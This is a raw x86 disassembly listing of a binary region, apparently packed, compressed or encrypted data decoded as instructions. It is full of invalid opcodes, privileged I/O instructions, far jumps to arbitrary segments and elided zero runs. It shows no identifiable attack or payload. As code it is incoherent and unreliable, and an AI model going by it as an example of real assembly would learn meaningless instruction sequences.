  4299b2:	jl     0x4299d8
  4299b4:	daa    
  4299b5:	test   BYTE PTR [esi],ch
  4299b7:	adc    BYTE PTR [ebp-0x3f84a64],dh
  4299bd:	push   ecx
  4299be:	jne    0x4299bc
  4299c0:	and    BYTE PTR [esi-0x5542db42],bh
  4299c6:	sahf   
  4299c7:	mov    esp,0x2274b9ca
  4299cc:	mov    cs,edx
  4299ce:	jae    0x42997d
  4299d0:	mov    bh,0xa2
  4299d2:	js     0x429a44
  4299d4:	adc    BYTE PTR [edx],bh
  4299d6:	test   al,0xea
  4299d8:	addr16 fucomi st,st(5)
  4299db:	fild   WORD PTR [edx+0x43c7de46]
  4299e1:	cmp    dh,BYTE PTR [eax+0x2335fd89]
  4299e7:	ss aad 0x7a
  4299ea:	and    al,0x5
  4299ec:	dec    edi
  4299ed:	loopne 0x429a63
  4299ef:	or     bl,BYTE PTR [edi]
  4299f1:	js     0x429a56
  4299f3:	mov    DWORD PTR [esi-0x1b3a4f04],ebp
  4299f9:	shl    BYTE PTR [esi+edi*4-0x33df8031],0xa
  429a01:	les    eax,FWORD PTR [edx+edi*2]
  429a04:	in     eax,0x0
  429a06:	nop
  429a07:	jl     0x4299da
  429a09:	mov    eax,0x391655b3
  429a0e:	lea    eax,[esi-0x44]
  429a11:	and    al,0xcc
  429a13:	sub    DWORD PTR [eax+0x17],esi
  429a16:	(bad)  
  429a17:	aas    
  429a18:	mov    esi,DWORD PTR [edx]
  429a1a:	adc    DWORD PTR [eax+0x75],edi
  429a1d:	sub    DWORD PTR [edx+0x423ff227],0x14
  429a24:	push   esi
  429a25:	sahf   
  429a26:	loope  0x4299b3
  429a28:	retf   
  429a29:	adc    dl,0xdc
  429a2c:	add    al,0xa5
  429a2e:	imul   esp,DWORD PTR [ebx+ecx*1],0x49
  429a32:	cmp    edx,DWORD PTR [ebp+0x70]
  429a35:	mov    bl,dl
  429a37:	arpl   WORD PTR [edx+0x1e],sp
  429a3a:	ret    
  429a3b:	fnstenv [ebx+eiz*4+0x51f8533b]
  429a42:	sub    BYTE PTR [eax+esi*2],ah
  429a45:	jno    0x429a5c
  429a47:	push   0xe728c0b
  429a4c:	cmp    DWORD PTR [ecx-0x5e],esi
  429a4f:	sub    BYTE PTR [edx+0x56],0xd7
  429a53:	jne    0x429a90
  429a55:	shr    DWORD PTR [eax],0x36
  429a58:	pop    edx
  429a59:	sbb    DWORD PTR [ebx-0x48c79555],edx
  429a5f:	in     al,0xab
  429a61:	bnd call 0x7ba876c8
  429a67:	sub    al,0x24
  429a69:	jo     0x4299f0
  429a6b:	pop    edi
  429a6c:	and    BYTE PTR [ebp-0x5dbdb041],bl
  429a72:	loop   0x429a00
  429a74:	push   ss
  429a75:	inc    ebp
  429a76:	inc    edi
  429a77:	loope  0x429a74
  429a79:	pop    eax
  429a7a:	ss pop esi
  429a7c:	and    eax,0x6fc066c5
  429a81:	stos   BYTE PTR es:[edi],al
  429a82:	lock dec edi
  429a84:	mov    cl,0x66
  429a86:	xchg   edx,eax
  429a87:	out    0xd,eax
  429a89:	jno    0x429add
  429a8b:	outs   dx,DWORD PTR ds:[esi]
  429a8c:	jno    0x429ac0
  429a8e:	push   cs
  429a8f:	add    bh,BYTE PTR [eax+0x0]
	...
  429af2:	add    BYTE PTR [eax],al
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x8da95667
  429b01:	stos   BYTE PTR es:[edi],al
  429b02:	xlat   BYTE PTR fs:[ebx]
  429b04:	fs mov esi,0x1050001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	repz pop eax
  429b0e:	imul   DWORD PTR ds:0x6d98e636
  429b14:	or     al,0xf5
  429b16:	test   DWORD PTR [esi+0x28],edi
  429b19:	lahf   
  429b1a:	mov    ch,0x6b
  429b1c:	push   ecx
  429b1d:	sub    al,0xd5
  429b1f:	rol    DWORD PTR [esi+0x1dc171fb],0xae
  429b26:	and    ah,cl
  429b28:	(bad)
  429b2b:	aaa    
  429b2c:	sbb    al,0x83
  429b2e:	mov    eax,ds:0xfe9969e4
  429b33:	pop    ss
  429b34:	repz call 0x316f929b
  429b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b3b:	xchg   ebx,eax
  429b3c:	aam    0xf2
  429b3e:	xchg   ebp,eax
  429b3f:	jmp    0xad3f164c
  429b44:	cmp    ch,BYTE PTR [ebx]
  429b46:	mov    al,ds:0xff91da28
  429b4b:	xor    eax,0xffffff9f
  429b4e:	mov    al,BYTE PTR [ebx*2-0x49028002]
  429b55:	xchg   esi,eax
  429b56:	retf   
  429b57:	jne    0x429b63
  429b59:	jo     0x429b83
  429b5b:	dec    eax
  429b5c:	mov    eax,0xc7123835
  429b61:	and    edx,DWORD PTR [ebp+eiz*1-0x62]
  429b65:	sahf   
  429b66:	rcl    DWORD PTR [ecx+0x6b],cl
  429b69:	adc    eax,0xe3e9f809
  429b6e:	mov    al,BYTE PTR [esi+0x262217d7]
  429b74:	add    dl,dl
  429b76:	hlt    
  429b77:	loope  0x429bc7
  429b79:	imul   esi,DWORD PTR [ebx+ebp*8],0x37
  429b7d:	inc    esi
  429b7e:	inc    BYTE PTR [ebx+0x19d0c49d]
  429b84:	neg    DWORD PTR [ebp-0x5f95b06a]
  429b8a:	out    0x63,eax
  429b8c:	(bad)  
  429b8d:	jae    0x429b71
  429b8f:	mov    bh,0xd0
  429b91:	pop    ebx
  429b92:	ss mov edx,0x4b2dce4
  429b98:	shr    BYTE PTR ds:[edi],cl
  429b9b:	mov    cl,0xb6
  429b9d:	cmc    
  429b9e:	xor    al,0xce
  429ba0:	inc    ebp
  429ba1:	ins    DWORD PTR es:[edi],dx
  429ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ba3:	ins    DWORD PTR es:[edi],dx
  429ba4:	jl     0x429bf0
  429ba6:	xchg   DWORD PTR [edi],ebx
  429ba8:	pushf  
  429ba9:	(bad)  
  429baa:	test   eax,0x5da81ea2
  429baf:	dec    eax
  429bb0:	jecxz  0x429bfe
  429bb2:	(bad)  
  429bb3:	clc    
  429bb4:	fisttp DWORD PTR [ebp-0x11]
  429bb7:	mov    eax,ds:0x33935ff
  429bbc:	jmp    0x492d:0x860552a6
  429bc3:	popf   
  429bc4:	inc    esp
  429bc5:	ds aad 0x3d
  429bc8:	out    dx,al
  429bc9:	xor    esp,DWORD PTR [eax+0x750c74d]
  429bcf:	fs aas 
  429bd1:	adc    al,0xca
  429bd3:	rol    DWORD PTR [esi],0xfc
  429bd6:	fisubr WORD PTR [edx-0x75]
  429bd9:	stos   DWORD PTR es:[edi],eax
  429bda:	push   edx
  429bdb:	ficom  WORD PTR [edx-0x63]
  429bde:	mov    al,0xb
  429be0:	js     0x429c09
  429be2:	or     al,0xd0
  429be4:	pop    edx
  429be5:	ror    DWORD PTR [ebx+0x212884f2],0x2f
  429bec:	inc    ebx
  429bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429bee:	ins    BYTE PTR es:[edi],dx
  429bef:	js     0x429bdd
  429bf1:	dec    ebx
  429bf2:	retf   
  429bf3:	ret    0x2bdf
  429bf6:	outs   dx,DWORD PTR ds:[esi]
  429bf7:	pop    ecx
  429bf8:	or     BYTE PTR [esi+ebp*4+0x31],dh
  429bfc:	and    DWORD PTR [eax+eax*4+0x9],edi
  429c00:	das    
  429c01:	push   ds
  429c02:	push   es
  429c03:	test   al,0x1b
  429c05:	xchg   edi,eax
  429c06:	inc    esp
  429c07:	loopne 0x429c18
  429c09:	xchg   edx,eax
  429c0a:	and    BYTE PTR [edx+ebx*8-0x36],ch
  429c0e:	jp     0x429bf8
  429c10:	sbb    eax,0x0
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [edx+0x69dc487e],dh
  429c85:	mov    edi,0x1050001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	inc    edi
  429c8d:	sub    DWORD PTR [ebx-0x5a],edx
  429c90:	enter  0xf455,0xda
  429c94:	cmc    
  429c95:	popa   
  429c96:	sti    
  429c97:	jmp    0x429ced
  429c99:	jl     0x429c8c
  429c9b:	fdiv   DWORD PTR [esi+0x546a5d4a]
  429ca1:	push   esi
  429ca2:	imul   eax,DWORD PTR [esi],0xffffffd0
  429ca5:	in     al,0x4f
  429ca7:	cs xor eax,0xb8f94d81
  429cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429cae:	cdq    
  429caf:	mov    ah,0x3a
  429cb1:	inc    eax
  429cb2:	loop   0x429c5f
  429cb4:	dec    edx
  429cb5:	add    eax,0x49530839
  429cba:	adc    DWORD PTR [edi-0x22],eax
  429cbd:	lahf   
  429cbe:	push   es
  429cbf:	std    
  429cc0:	dec    esp
  429cc1:	xor    esp,DWORD PTR [ebp+0x193e3618]
  429cc7:	ja     0x429c9f
  429cc9:	mov    dl,0x78
  429ccb:	dec    ebp
  429ccc:	cmp    eax,0x1550881b
  429cd1:	(bad)  
  429cd3:	cmp    eax,0xa53875a7
  429cd8:	(bad)  
  429cd9:	stos   DWORD PTR es:[edi],eax
  429cda:	cwde   
  429cdb:	jno    0x429c69
  429cdd:	mov    ss,WORD PTR [edi+edx*2-0x7d]
  429ce1:	sti    
  429ce2:	xor    DWORD PTR [ebx+0x3c7d0419],ebx
  429ce8:	jge    0x429ccf
  429cea:	sbb    al,0x99
  429cec:	shl    edi,cl
  429cee:	sbb    al,0x15
  429cf0:	push   eax
  429cf1:	sbb    DWORD PTR [esp+eax*4-0x7b],ebx
  429cf5:	frstor [ebp-0x759e93a0]
  429cfb:	loop   0x429d0e
  429cfd:	(bad)  
  429cfe:	std    
  429cff:	test   DWORD PTR [esi],eax
  429d01:	sub    eax,0x75f79eaf
  429d06:	mov    cl,0x75
  429d08:	and    al,0xd5
  429d0a:	sub    eax,ebp
  429d0c:	test   DWORD PTR [esi-0x3638fc4d],esi
  429d12:	jl     0x429c94
  429d14:	cmp    BYTE PTR [edi+0xe],0xd5
  429d18:	sti    
  429d19:	jnp    0x429d59
  429d1b:	call   0x5a26:0x419245b2
  429d22:	pop    ds
  429d23:	push   edi
  429d24:	mov    eax,0x5ff1afc7
  429d29:	imul   edi,DWORD PTR [eax-0x6e],0x7d6152f8
  429d30:	sub    BYTE PTR [ebp+edi*1-0x4f15ef6c],0x5b
  429d38:	mov    ch,al
  429d3a:	sbb    eax,ebx
  429d3c:	lods   al,BYTE PTR ds:[esi]
  429d3d:	add    al,0xf4
  429d3f:	(bad)  
  429d40:	push   edi
  429d41:	sbb    BYTE PTR [eax+0x43759895],bl
  429d47:	jns    0x429d80
  429d49:	popa   
  429d4a:	sahf   
  429d4b:	ja     0x429d71
  429d4d:	in     al,0x1c
  429d4f:	mov    bh,0xd1
  429d51:	test   dh,bh
  429d53:	push   ss
  429d54:	ja     0x429d64
  429d56:	pop    ds
  429d57:	inc    edx
  429d58:	xor    esp,eax
  429d5a:	inc    ebx
  429d5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d5c:	xor    ecx,edx
  429d5e:	iret   
  429d5f:	or     eax,0x38d9f4e5
  429d64:	outs   dx,BYTE PTR ds:[esi]
  429d65:	pop    edx
  429d66:	lea    eax,[eax+0x29]
  429d69:	add    BYTE PTR [ebx],bh
  429d6b:	rcl    edi,cl
  429d6d:	rcl    BYTE PTR [eax+0x18],1
  429d70:	or     al,0x52
  429d72:	cwde   
  429d73:	aad    0x6
  429d75:	imul   ecx,DWORD PTR [edi+0x6585e682],0x66051a5
  429d7f:	sti    
  429d80:	mov    eax,0x396fc4a8
  429d85:	xchg   DWORD PTR [edi+eax*8+0x10],edx
  429d89:	jne    0x429d2e
  429d8b:	scas   al,BYTE PTR es:[edi]
  429d8c:	popa   
  429d8d:	pop    edx
  429d8e:	mov    ebp,0xb2b2
	...
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	jecxz  0x429da1
  429e02:	aas    
  429e03:	xchg   esp,eax
  429e04:	outs   dx,BYTE PTR ds:[esi]
  429e05:	rol    BYTE PTR [ecx],0x0
  429e08:	add    eax,0x21000001
  429e0d:	pop    ecx
  429e0e:	adc    edx,DWORD PTR [esi]
  429e10:	and    al,0xaf
  429e12:	xchg   ebx,eax
  429e13:	ret    0x6d83
  429e16:	pop    ds
  429e17:	vpmaxub ymm6,ymm0,ymm6
  429e1b:	dec    ebp
  429e1c:	mov    dl,0xfa
  429e1e:	adc    al,0xc9
  429e20:	pop    esi
  429e21:	aam    0x42
  429e23:	ss or  eax,0x4de88496
  429e29:	pop    ebx
  429e2a:	mov    dl,0x8f
  429e2c:	(bad)  
  429e2d:	mov    edx,esp
  429e2f:	sub    eax,0x1e8361e4
  429e34:	xchg   BYTE PTR [edi+eiz*4+0x28],ch
  429e38:	xchg   edx,eax
  429e39:	mov    bh,0x31
  429e3b:	push   edx
  429e3c:	jecxz  0x429e07
  429e3e:	xor    eax,0xe8c8316f
  429e43:	(bad)  
  429e44:	inc    ecx
  429e45:	mov    edi,0xf862e3df
  429e4a:	xor    BYTE PTR [ebp+0x5b],dh
  429e4d:	(bad)  
  429e4e:	int3   
  429e4f:	pusha  
  429e50:	in     eax,0xec
  429e52:	inc    ecx
  429e53:	jmp    0x429e92
  429e55:	jmp    0xded24d18
  429e5a:	inc    esi
  429e5b:	pop    ebp
  429e5c:	in     al,dx
  429e5d:	mov    bl,0xe8
  429e5f:	sub    DWORD PTR [ebx+0x596f72f2],ecx
  429e65:	jns    0x429e1f
  429e67:	cmp    DWORD PTR [edx],esp
  429e69:	in     eax,0xfc
  429e6b:	in     al,dx
  429e6c:	out    0xc6,eax
  429e6e:	mov    edi,0x86e785ec
  429e73:	aad    0xae
  429e75:	in     al,dx
  429e76:	jp     0x429e0f
  429e78:	popa   
  429e79:	jge    0x429ea3
  429e7b:	hlt    
  429e7c:	push   esp
  429e7d:	lock inc DWORD PTR [edi]
  429e80:	sbb    ecx,0x3c85ef2
  429e86:	aas    
  429e87:	(bad)  
  429e88:	addr16 pushf 
  429e8a:	dec    ecx
  429e8b:	not    dh
  429e8d:	jle    0x429e5d
  429e8f:	adc    BYTE PTR [ecx+ebx*8+0x18c6f99b],bl
  429e96:	pop    ebp
  429e97:	push   ds
  429e98:	xchg   DWORD PTR [eax+ecx*2],edi
  429e9b:	dec    al
  429e9d:	icebp  
  429e9e:	jns    0x429ee7
  429ea0:	jge    0x429eb7
  429ea2:	fnstenv [ecx]
  429ea4:	call   0x5cfd:0x8db540ff
  429eab:	fstp   DWORD PTR [ecx+0x6a]
  429eae:	inc    ebp
  429eaf:	xchg   ecx,eax
  429eb0:	scas   al,BYTE PTR es:[edi]
  429eb1:	pop    eax
  429eb2:	cs sahf 
  429eb4:	jle    0x429eb7
  429eb6:	test   eax,0x8cbe88b4
  429ebb:	ja     0x429e3e
  429ebd:	cmc    
  429ebe:	into   
  429ebf:	sub    eax,0xf94312ef
  429ec4:	xchg   edx,eax
  429ec5:	popf   
  429ec6:	cli    
  429ec7:	outs   dx,BYTE PTR ds:[esi]
  429ec8:	and    BYTE PTR [edi+eiz*1+0x6b4dcced],0x8e
  429ed0:	cs daa 
  429ed2:	div    DWORD PTR [eax]
  429ed4:	out    dx,al
  429ed5:	lahf   
  429ed6:	outs   dx,DWORD PTR ds:[esi]
  429ed7:	(bad)  
  429ed9:	out    0x3d,al
  429edb:	mov    bl,0xb9
  429edd:	adc    al,0xa5
  429edf:	pusha  
  429ee0:	xor    edx,esp
  429ee2:	cmc    
  429ee3:	mov    esp,0x53b4298d
  429ee8:	and    al,BYTE PTR [edi]
  429eea:	pop    ss
  429eeb:	add    BYTE PTR [esp+edx*4],ch
  429eee:	shr    BYTE PTR [esi-0x5fd97048],cl
  429ef4:	and    al,0x54
  429ef6:	and    bh,cl
  429ef8:	dec    esp
  429ef9:	xor    DWORD PTR [eax],ecx
  429efb:	test   DWORD PTR [ecx],esi
  429efd:	dec    esi
  429efe:	loopne 0x429f74
  429f00:	dec    ebp
  429f01:	lar    edi,sp
  429f04:	xchg   edi,eax
  429f05:	out    0xa4,eax
  429f07:	mov    BYTE PTR [ebp+0x67f7bcbf],bh
  429f0d:	aad    0xfe
  429f0f:	dec    ebx
  429f10:	sbb    DWORD PTR [eax],eax
	...
  429f72:	add    BYTE PTR [eax],al
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x2c609109]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0x55000001
  429f8d:	or     al,0xa3
  429f8f:	push   ss
  429f90:	scas   eax,DWORD PTR es:[edi]
  429f91:	in     al,0x41
  429f93:	lds    eax,FWORD PTR [ebx+0x1cb758c7]
  429f99:	xlat   BYTE PTR es:[ebx]
  429f9b:	int3   
  429f9c:	add    DWORD PTR [edi-0x3e],esp
  429f9f:	push   ss
  429fa0:	sbb    BYTE PTR [esi-0x190758bb],0x5
  429fa7:	addr16 ss leave 
  429faa:	arpl   WORD PTR [edx],si
  429fac:	aas    
  429fad:	in     eax,0x6b
  429faf:	(bad)  
  429fb0:	loop   0x429f88
  429fb2:	outs   dx,BYTE PTR ds:[esi]
  429fb3:	mov    edi,0xb427d181
  429fb8:	aad    0xf7
  429fba:	push   esi
  429fbb:	int3   
  429fbc:	je     0x429ff1
  429fbe:	shl    cl,1
  429fc0:	leave  
  429fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fc2:	call   0x82e56453
  429fc7:	adc    esp,DWORD PTR [ebx]
  429fc9:	hlt    
  429fca:	sbb    DWORD PTR [edi+0x331cd22],0x9392edb1
  429fd4:	jns    0x429f8e
  429fd6:	xchg   ecx,eax
  429fd7:	jmp    0x429f5f
  429fd9:	jp     0x429f75
  429fdb:	sbb    esp,edx
  429fdd:	sar    DWORD PTR [ebp+0x56f02ea9],0x87
  429fe4:	in     eax,dx
  429fe5:	loop   0x429f8d
  429fe7:	jl     0x42a051
  429fe9:	add    al,0xac
  429feb:	imul   ebp,DWORD PTR [ecx],0xa95038a2
  429ff1:	cld    
  429ff2:	xchg   esi,eax
  429ff3:	pop    es
  429ff4:	jo     0x42a039
  429ff6:	test   ecx,edi
  429ff8:	mov    ebp,0xd4759911
  429ffd:	cld    
  429ffe:	sti    
  429fff:	int    0x5e
  42a001:	loopne 0x42a024
  42a003:	out    dx,eax
  42a004:	jns    0x42a069
  42a006:	pop    edi
  42a007:	mov    ds:0x292e6de1,eax
  42a00c:	lock mov ah,0x7b
  42a00f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a010:	adc    dl,BYTE PTR [esi-0x3064fd30]
  42a016:	or     esp,DWORD PTR [ebp-0x37]
  42a019:	mov    ds:0x713b8e72,eax
  42a01e:	shl    DWORD PTR [edi-0x13d8e02e],1
  42a024:	mov    ecx,0xfff60126
  42a029:	call   0x7101:0xd6362b93
  42a030:	pop    ds
  42a031:	add    eax,0x1955da52
  42a036:	in     al,0x25
  42a038:	adc    al,0x4a
  42a03a:	push   0x7c12ccd6
  42a03f:	repz dec ebp
  42a041:	fs jl  0x42a0a8
  42a044:	push   bx
  42a046:	enter  0x85dc,0xbe
  42a04a:	aas    
  42a04b:	adc    dl,dh
  42a04d:	pop    es
  42a04e:	pop    edi
  42a04f:	jo     0x42a02e
  42a051:	xchg   ebp,eax
  42a052:	repnz stc 
  42a054:	fwait
  42a055:	rol    DWORD PTR [ecx],1
  42a057:	mov    ecx,0x798317eb
  42a05c:	iret   
  42a05d:	leave  
  42a05e:	fdiv   DWORD PTR [edx]
  42a060:	outs   dx,DWORD PTR ds:[esi]
  42a061:	bound  edi,QWORD PTR [edi+edi*2]
  42a064:	push   es
  42a065:	inc    esp
  42a066:	cld    
  42a067:	lds    ecx,FWORD PTR [esi+eiz*1-0x76f40193]
  42a06e:	pop    ebx
  42a06f:	mov    dh,0x74
  42a071:	(bad)  
  42a072:	jl     0x42a04a
  42a074:	pop    esp
  42a075:	sbb    eax,0xb966b25
  42a07a:	mov    bh,0x17
  42a07c:	mov    ecx,0xfd42110
  42a081:	outs   dx,DWORD PTR ds:[esi]
  42a082:	lods   al,BYTE PTR ds:[esi]
  42a083:	std    
  42a084:	cld    
  42a085:	adc    bh,ch
  42a087:	adc    eax,0x1ede1259
  42a08c:	(bad)  [ebp+0x9bd6dc]
	...
  42a0f2:	add    BYTE PTR [eax],al
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	xlat   BYTE PTR ds:[ebx]
  42a101:	js     0x42a146
  42a103:	loop   0x42a17d
  42a105:	ret    0x1
  42a108:	add    eax,0x51000001
  42a10d:	or     bl,BYTE PTR [edx-0x27]
  42a110:	cmp    al,0xec
  42a112:	and    DWORD PTR [ebx+0x27],edi
  42a115:	std    
  42a116:	and    DWORD PTR [esi-0x4e],edi
  42a119:	adc    eax,0xb2a08887
  42a11e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a11f:	jmp    0x9f0c3f06
  42a124:	add    DWORD PTR ds:0x66f22c61,ebx
  42a12a:	shr    BYTE PTR [ecx],1
  42a12c:	sbb    eax,ebx
  42a12e:	in     al,0x4d
  42a130:	mov    ds,edx
  42a132:	jae    0x42a0bb
  42a134:	pop    esp
  42a135:	(bad)  
  42a136:	fild   QWORD PTR ds:0x3477a87f
  42a13c:	cs dec ebx
  42a13e:	gs fs sti 
  42a141:	push   ds
  42a142:	push   edi
  42a143:	test   DWORD PTR [edx+0x44],edi
  42a146:	imul   ecx,DWORD PTR [eax+ebp*4+0x39],0x32
  42a14b:	daa    
  42a14c:	rcr    BYTE PTR [edx-0x48],0x81
  42a150:	nop
  42a151:	cmp    ecx,DWORD PTR ss:[edi]
  42a154:	jl     0x42a0ff
  42a156:	jns    0x42a1a4
  42a158:	lea    ebx,[esi+0x4b]
  42a15b:	mov    ch,0x40
  42a15d:	inc    ebp
  42a15e:	aaa    
  42a15f:	push   0xeafaefcd
  42a164:	div    BYTE PTR [eax+0x4c]
  42a167:	pop    ecx
  42a168:	dec    ebx
  42a169:	push   ebx
  42a16a:	xor    al,0xde
  42a16c:	or     eax,0x7494c107
  42a171:	add    BYTE PTR [ebx-0x76fbc808],bl
  42a177:	add    eax,0xe754c681
  42a17c:	pop    ecx
  42a17d:	inc    esi
  42a17e:	xor    ebp,DWORD PTR [edi+0x201b039e]
  42a184:	or     edx,DWORD PTR [ebx+eax*1]
  42a187:	add    BYTE PTR [ecx],bl
  42a189:	inc    edi
  42a18a:	inc    eax
  42a18b:	(bad)  
  42a18c:	mov    eax,0xad6cd13d
  42a191:	inc    BYTE PTR [edi-0x56]
  42a194:	gs hlt 
  42a196:	xchg   edx,eax
  42a197:	nop
  42a198:	adc    WORD PTR [edx-0x1d],0x8807
  42a19e:	sti    
  42a19f:	push   ss
  42a1a0:	mov    cl,cl
  42a1a2:	adc    esi,edx
  42a1a4:	xor    edx,DWORD PTR [ebp-0x5f]
  42a1a7:	sub    dl,BYTE PTR [ecx-0x30]
  42a1aa:	dec    edi
  42a1ab:	test   al,0xeb
  42a1ad:	retf   
  42a1ae:	jo     0x42a1e0
  42a1b0:	add    eax,0x770433f4
  42a1b5:	aas    
  42a1b6:	mov    dl,0x18
  42a1b8:	dec    edx
  42a1b9:	push   0xc57b7ad4
  42a1be:	sbb    bl,bh
  42a1c0:	mov    esi,esp
  42a1c2:	imul   edi,DWORD PTR [ecx+0x6c6cef2b],0x4f
  42a1c9:	xchg   ecx,edi
  42a1cb:	call   0xeb95a43
  42a1d0:	push   es
  42a1d1:	cmp    eax,0xef5a57f0
  42a1d6:	hlt    
  42a1d7:	adc    BYTE PTR [ecx],bl
  42a1d9:	or     DWORD PTR [ebp+0x51],ecx
  42a1dc:	pop    eax
  42a1dd:	clc    
  42a1de:	call   0x8375:0x61949f62
  42a1e5:	or     BYTE PTR [eax-0x65],bh
  42a1e8:	aas    
  42a1e9:	mov    ebx,edx
  42a1eb:	in     al,0x77
  42a1ed:	jne    0x42a18d
  42a1ef:	leave  
  42a1f0:	inc    edx
  42a1f1:	add    al,0x97
  42a1f3:	retf   
  42a1f4:	ret    
  42a1f5:	call   0xaec1:0x5864e30c
  42a1fc:	lods   eax,DWORD PTR ds:[esi]
  42a1fd:	add    ah,dl
  42a1ff:	das    
  42a200:	dec    esi
  42a201:	mov    bl,0x2f
  42a203:	fistp  QWORD PTR [edi+0x2c33937e]
  42a209:	mov    esi,0x38e8d8b
  42a20e:	adc    eax,0xbcdf
	...
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fldcw  WORD PTR [ebx-0x27]
  42a282:	sub    BYTE PTR [esi+0x1c37d],dh
  42a288:	add    eax,0xe6000001
  42a28d:	xor    ebp,DWORD PTR ds:0x24e4f613
  42a293:	iret   
  42a294:	arpl   WORD PTR [edx],bp
  42a296:	imul   eax
  42a298:	repnz cld 
  42a29a:	mov    ebx,0x6846b51b
  42a29f:	xchg   esi,eax
  42a2a0:	repnz aad 0x18
  42a2a3:	dec    edi
  42a2a4:	pop    es
  42a2a5:	jle    0x42a2a6
  42a2a7:	dec    ecx
  42a2a8:	add    al,0x50
  42a2aa:	dec    eax
  42a2ab:	lock push ecx
  42a2ad:	mov    DWORD PTR [esi],ebp
  42a2af:	test   al,al
  42a2b1:	pop    ecx
  42a2b2:	fwait
  42a2b3:	xor    dl,BYTE PTR [edx-0x70]
  42a2b6:	(bad)  
  42a2b7:	out    0x85,eax
  42a2b9:	and    DWORD PTR [eax],ecx
  42a2bb:	mov    BYTE PTR [edi-0x2f],ch
  42a2be:	imul   ecx,DWORD PTR [ebp+0x3a],0xffffff88
  42a2c2:	mov    bl,bh
  42a2c4:	out    0x8e,eax
  42a2c6:	ins    BYTE PTR es:[edi],dx
  42a2c7:	mov    bl,0xc0
  42a2c9:	arpl   bx,bx
  42a2cb:	or     al,0x31
  42a2cd:	xor    BYTE PTR [edx],0x20
  42a2d0:	nop
  42a2d1:	jnp    0x42a297
  42a2d3:	pop    eax
  42a2d5:	lds    eax,FWORD PTR [ebx-0x2d6f359c]
  42a2db:	dec    esp
  42a2dc:	mov    edi,0xd822f841
  42a2e1:	mov    ds:0x8ab65f0d,eax
  42a2e6:	cmc    
  42a2e7:	mov    edx,0xbdfcf61c
  42a2ec:	leave  
  42a2ed:	aad    0x47
  42a2ef:	in     eax,dx
  42a2f0:	dec    esi
  42a2f1:	push   esi
  42a2f2:	hlt    
  42a2f3:	out    0xdb,eax
  42a2f5:	or     al,0xae
  42a2f7:	inc    eax
  42a2f8:	mov    dl,0xf2
  42a2fa:	and    al,0xf4
  42a2fc:	push   cs
  42a2fd:	mov    esp,?
  42a2ff:	mov    esp,DWORD PTR [edi]
  42a301:	adc    ah,0x4e
  42a304:	push   ds
  42a305:	dec    edx
  42a306:	mov    bl,0x5e
  42a308:	push   DWORD PTR [ecx-0x10]
  42a30b:	(bad)  
  42a30c:	ins    BYTE PTR es:[edi],dx
  42a30d:	(bad)  
  42a30e:	jmp    0x6c1b:0x216f76a2
  42a315:	not    BYTE PTR [ebp+0x2722bb51]
  42a31b:	cwde   
  42a31c:	and    BYTE PTR [edx],ch
  42a31e:	pop    edi
  42a31f:	int    0x90
  42a321:	pop    ecx
  42a322:	dec    edi
  42a323:	or     DWORD PTR [ecx],edx
  42a325:	xchg   ch,ah
  42a327:	out    dx,eax
  42a328:	pop    ebp
  42a329:	dec    ecx
  42a32a:	adc    esi,DWORD PTR [eax]
  42a32c:	inc    ecx
  42a32d:	test   al,0x60
  42a32f:	push   ebx
  42a330:	and    esi,DWORD PTR [ecx-0x242e672d]
  42a336:	xchg   DWORD PTR [ebx+0x3488d463],ebx
  42a33c:	ins    DWORD PTR es:[edi],dx
  42a33d:	xchg   ebx,eax
  42a33e:	mov    al,ds:0xe7ded810
  42a343:	cs icebp 
  42a345:	pop    edx
  42a346:	sbb    al,0x54
  42a348:	lock mov BYTE PTR [edx],cl
  42a34b:	out    dx,eax
  42a34c:	cmc    
  42a34d:	sub    al,0x20
  42a34f:	mov    cl,0x7d
  42a351:	mov    eax,0xd7ce0f74
  42a356:	mov    ah,0x12
  42a358:	imul   esp,DWORD PTR [edx+0x25],0x4
  42a35c:	or     ebx,esi
  42a35e:	(bad)  
  42a35f:	(bad)  [esi]
  42a361:	and    eax,0xef94d206
  42a366:	sbb    DWORD PTR [esi+0x1fe7936b],edi
  42a36c:	clc    
  42a36d:	dec    edx
  42a36e:	pop    es
  42a36f:	sahf   
  42a370:	ret    0x6001
  42a373:	popa   
  42a374:	cdq    
  42a375:	test   DWORD PTR [ebx+ebx*2-0x73],0x75477ef3
  42a37d:	cmp    al,0x2e
  42a37f:	call   0x35e2099c
  42a384:	cmc    
  42a385:	ret    0x49a
  42a388:	stos   DWORD PTR es:[edi],eax
  42a389:	not    DWORD PTR [edi+0x14]
  42a38c:	xchg   DWORD PTR [eax],edi
